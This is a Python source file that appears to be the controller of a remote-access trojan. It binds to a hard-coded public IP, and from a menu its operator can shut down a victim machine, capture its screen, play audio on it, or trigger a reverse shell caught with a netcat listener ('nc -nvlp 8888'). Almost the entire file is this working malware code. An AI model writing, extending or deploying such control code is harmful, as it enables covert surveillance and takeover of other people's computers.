import socket

def MyRecv(client_soc , length : int):
    common = length
    data = b''
    while common != 0:
        curr_data = client_sock.recv(common)
        if len(curr_data) == 0:
            print("__________________________________________________")
            print("|         Client close the connection             |")
            print("|         Restart your programm                   |")
            print("|_________________________________________________|")
            exit(0)
        common -= len(curr_data)
        data += curr_data
    return data
    

class State:
    CONNECTION_NON_ESTABLISHED_RECV = 0
    CONNECTION_NON_ESTABLISHED_SEND = 1
    GETTING_SCREENSHOT = 2
    INPUT_COMMAND = 3
    PLAY_SOUND = 4
    SHUTDOWN_CLIENT_MACHINE = 5
    EXIT= 6
    REVERSE_SHELL = 7

ServerSock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
ServerSock.bind(('94.198.218.23' , 9999))
ServerSock.listen(2)

cState = State.CONNECTION_NON_ESTABLISHED_RECV

while True:
    client_sock , client_addr = ServerSock.accept()
    print('Connection from: ' , client_addr)
    while True:
        if (cState == State.CONNECTION_NON_ESTABLISHED_RECV):
            data = MyRecv(client_sock , 4096)
            if not(b"Client Hallo" in data):
                print("Error: Incorrect client message : " , data)
                exit(0)
            cState = State.CONNECTION_NON_ESTABLISHED_SEND
            continue

        if (cState == State.CONNECTION_NON_ESTABLISHED_SEND):
            data = "Server Hallo" + '\x00' * 4084
            data = data.encode('utf-8')
            client_sock.send(data)
            cState = State.INPUT_COMMAND
            continue

        if (cState == State.INPUT_COMMAND):
            print("---------------------------------Your command---------------------------------")
            print("\tShutDown Client Machine : 1")
            print("\tGet ScreenShot from Client Machine : 2")
            print("\tPlay Sound in Client Machine : 3")
            print("\tExit : 4")
            print("\tGet ReverseShell : 5")
            tCommand = 0
            while True:
                print("Input number of command[1-5]: " , end = "")
                try:
                    tCommand = int(input())
                    if (tCommand < 1 or tCommand > 5):
                        print("Incorrect Input")
                        continue
                    break
                except:
                    print("Incorrect Input")
                    continue
            if (tCommand == 1):
                cState = State.SHUTDOWN_CLIENT_MACHINE
                continue
            if (tCommand == 2):
                cState = State.GETTING_SCREENSHOT
                continue
            if (tCommand == 3):
                cState = State.PLAY_SOUND
                continue
            if (tCommand == 4):
                cState = State.EXIT
                continue
            if (tCommand == 5):
                cState = State.REVERSE_SHELL
                continue

        if cState == State.REVERSE_SHELL:
            message = ("REMOTESHELL" + '\x00' * 4085).encode('utf-8')
            client_sock.send(message)
            print("NOW run: nc -nvlp 8888")
            cState = State.INPUT_COMMAND

        if (cState == State.SHUTDOWN_CLIENT_MACHINE):
            data = ("SHUTDOWN" + '\x00' * 4088).encode('utf-8')
            client_sock.send(data)
            print("\n---------------------------------------------\nOK\n--------------------------------------\n")
            client_sock.close()
            ServerSock.close()
            exit(0)

        if (cState == State.EXIT):
            message = ("EXIT" + '\x00' * 4092).encode('utf-8')
            client_sock.send(message)
            print("\n---------------------------------------------\nOK\n--------------------------------------\n")
            client_sock.close()
            ServerSock.close()
            exit(0)

        if (cState == State.GETTING_SCREENSHOT):
            message = ("SCREENSHOT" + '\x00' * 4086).encode('utf-8')
            client_sock.send(message)
            curr_number = 0
            with open("settings.txt" , 'r') as settings:
                curr_number_str = settings.readline()
                curr_number = int(curr_number_str)

            with open("settings.txt" , 'w') as settings:
                settings.write(str(curr_number + 1))
            
            screenshot_file = str(curr_number) + ".png"


            with open(screenshot_file , 'wb') as file:
                while True:
                    data = MyRecv(client_sock , 4096)
                    if b'ENDOFFILE' in  data:
                        break
                    file.write(data)

            cState = State.INPUT_COMMAND
            continue

        if (cState == State.PLAY_SOUND):
            while (True):
                print("\tПоместите ваш аудио-файл для воспроизведения в папку audio")
                filename = input("Введите название этого файла[вместе с расширением]: ")

                path = "audio/" + filename
                try:
                    with open(path , 'rb') as file:
                        pass
                    if (path.endswith('.mp3') or path.endswith('.mp4') or path.endswith('.wav')):
                        break
                    else:
                        print("Inccorect format of file")
                except:
                    print("Incorrect path to file")


            message = "PLAY\r\n"
            if filename.endswith('.mp3'):
                message += '.mp3'
            if filename.endswith('.mp4'):
                message += '.mp4'
            if filename.endswith('.wav'):
                message += '.wav'
            message += '\r\n'
            message = (message + '\x00' * (4096 - len(message))).encode('utf-8')
            client_sock.send(message)
            with open(path , 'rb') as audiofile:
                curr_data = audiofile.read(4096)
                while True:
                    client_sock.send(curr_data)
                    curr_data = audiofile.read(4096)
                    if len(curr_data) == 0:
                        break
                    if len(curr_data) != 4096:
                        curr_data = curr_data + b'\x00' * (4096 - len(curr_data))
            message = ("ENDOFFILE" + '\x00' * 4087).encode('utf-8')
            client_sock.send(message)
            print("\n---------------------------------------------\nOK\n--------------------------------------\n")    
            cState = State.INPUT_COMMAND
            continue

